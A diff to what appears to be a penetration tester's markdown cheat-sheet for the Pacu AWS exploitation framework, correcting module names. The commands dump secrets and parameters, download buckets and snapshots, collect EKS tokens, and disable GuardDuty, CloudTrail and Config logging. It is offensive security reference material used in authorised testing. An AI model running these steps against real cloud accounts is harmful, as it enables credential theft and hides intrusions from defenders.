@@ -136,25 +136,24 @@ aws iam list-role-policies --role-name <role>    # inline policies
 Pacu> run ec2__enum
 # Lists: instances, security groups, VPCs, subnets, key pairs, snapshots, AMIs
 
-# S3
-Pacu> run s3__enum
-# Lists all accessible buckets
-
+# S3 — enumerate + download accessible buckets in one module (there is no s3__enum)
 Pacu> run s3__download_bucket
-# Downloads contents of accessible S3 buckets (look for creds, configs, backups)
+# Look inside for creds, configs, backups
 
 # Lambda
 Pacu> run lambda__enum
 # Lists functions, environment variables (often contain secrets), layers
 
-# Secrets Manager / SSM Parameter Store
-Pacu> run secretsmanager__enum
-Pacu> run ssm__enum
-# Dumps all accessible secrets — frequently contains DB passwords, API keys
+# Secrets Manager (module is secrets__enum, not secretsmanager__enum)
+Pacu> run secrets__enum
+# Dumps accessible Secrets Manager secrets — DB passwords, API keys
 
-# CloudFormation
-Pacu> run cloudformation__enum
-# Templates often contain plaintext secrets and infrastructure layout
+# SSM Parameter Store (module is systemsmanager__download_parameters)
+Pacu> run systemsmanager__download_parameters
+
+# CloudFormation (module is cloudformation__download_data)
+Pacu> run cloudformation__download_data
+# Templates/stacks often contain plaintext secrets and infrastructure layout
 
 # RDS / databases
 Pacu> run rds__enum
@@ -163,9 +162,12 @@ Pacu> run rds__enum
 Pacu> run ecs__enum
 Pacu> run ecr__enum
 
-# EKS (Kubernetes)
+# EKS (Kubernetes) — enum + steal service-account tokens
 Pacu> run eks__enum
+Pacu> run eks__collect_tokens
 ```
+
+> [!note] **Module names verified against the repo (2026-08).** Older guides use `s3__enum` / `secretsmanager__enum` / `ssm__enum` / `cloudformation__enum` / `ebs__enum_snapshots_unauth` — **none of those exist**. Confirm any module with `Pacu> search <keyword>` before `run`.
 
 ---
 
@@ -240,8 +242,9 @@ Pacu> data Lambda    # check environmentVariables fields
 Pacu> run cloudtrail__download_event_history   # get your own activity logs first
 Pacu> run detection__disruption               # disable GuardDuty, CloudTrail, Config
 
-# EBS snapshots — copy to attacker account and mount
-Pacu> run ebs__enum_snapshots_unauth          # find public snapshots
+# EBS snapshots — enumerate, then download/explore for creds (no ebs__enum_snapshots_unauth module)
+Pacu> run ebs__enum_volumes_snapshots
+Pacu> run ebs__explore_snapshots
 ```
 
 ---
@@ -300,10 +303,10 @@ aws sts get-caller-identity
 
 ---
 
-> [!note] **See also** — [[Services/Cloud & Data/Databricks|Databricks]] — after stealing IAM role creds from a cluster's IMDS, use Pacu for deeper AWS enumeration/privesc in the underlying account.
+> [!note] **See also** — [[Services/Cloud & Data/Databricks|Databricks]] — after stealing IAM role creds from a cluster's IMDS, use Pacu for deeper AWS enumeration/privesc in the underlying account. [[Tools/Cloud/aws-cli|aws-cli]] for targeted follow-up; the GCP counterpart (no Pacu equivalent) is [[Tools/Cloud/GCP-IAM-PrivEsc|GCP IAM Privilege Escalation]].
 
 ---
 
 *Created: 2026-03-06*
-*Updated: 2026-03-06*
-*Model: claude-sonnet-4-6*
+*Updated: 2026-08-27*
+*Model: claude-opus-5*
